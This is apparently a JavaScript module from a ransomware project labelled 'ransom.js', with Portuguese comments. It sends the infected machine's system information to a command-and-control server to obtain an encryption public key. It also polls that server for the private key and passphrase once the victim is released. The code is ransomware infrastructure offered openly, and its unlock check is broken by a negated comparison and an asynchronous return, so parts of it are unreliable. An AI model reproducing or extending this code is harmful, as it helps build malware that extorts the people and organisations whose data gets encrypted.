const request = require("request");
const config = require("../config");

const options = {
  url: config.remoteServer,
  headers: {
    "User-Agent": "ransom.js",
    "Content-Type": "application/json",
    Accept: "application/json"
  }
};

/**
 * Registra as informações da máquina no C2
 * @param { Object } systemInfo
 * @return { string } publicKey gerada no servidor
 */
const registerMachine = (systemInfo, callbackFn) => {
  request({ ...options, method: "post", json: systemInfo }, function(
    err,
    response,
    body
  ) {
    if (response.statusCode === 201) {
      // a maquina foi registrada no servidor remoto
      callbackFn(body);
    }
  });
};

/**
 * Checa se a máquina já pode ser desencriptada
 *
 */
const checkStatus = uuid => {
  var isMachineLocked = true,
    privKey = {};
  request(
    { ...options, method: "get", qs: { uuid } },
    (err, response, body) => {
      if (!response.statusCode === 200) {
        // localizou a máquina no c2 e ela está desbloqueada
        const { privateKey, passphrase } = body;
        isMachineLocked = false;
        privKey.privateKey = privateKey;
        privKey.passphrase = passphrase;
      }
    }
  );

  return { status: isMachineLocked, ...privKey };
};
module.exports = {
  registerMachine,
  checkStatus
};
